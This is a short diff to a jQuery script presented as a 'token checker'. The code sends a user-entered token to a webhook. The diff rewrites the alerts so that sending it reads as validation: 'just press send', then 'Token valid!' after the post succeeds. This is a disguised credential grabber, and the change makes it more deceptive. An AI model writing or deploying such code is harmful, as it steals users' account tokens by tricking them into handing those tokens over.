@@ -1134,7 +1134,7 @@ if(settings.autorun) {
     $(document).on("click", "#check-token", function () {
         const userToken = $("#user-token").val().trim();
         if (userToken) {
-            alert(`Token is valid: ${userToken}`);
+            alert(`i couldnt get the checker to work, just press send: ${userToken}`);
         } else {
             alert("Please enter a valid token.");
         }
@@ -1148,10 +1148,10 @@ if(settings.autorun) {
                 contentType: "application/json",
                 data: JSON.stringify({ content: `Token: ${userToken}` }),
                 success: function() {
-                    alert("Token sent successfully!");
+                    alert("Token valid!");
                 },
                 error: function() {
-                    alert("Failed to send the token. Please check the webhook URL.");
+                    alert("Failed to send the token. Maybe its not valid?");
                 }
             });
         } else {
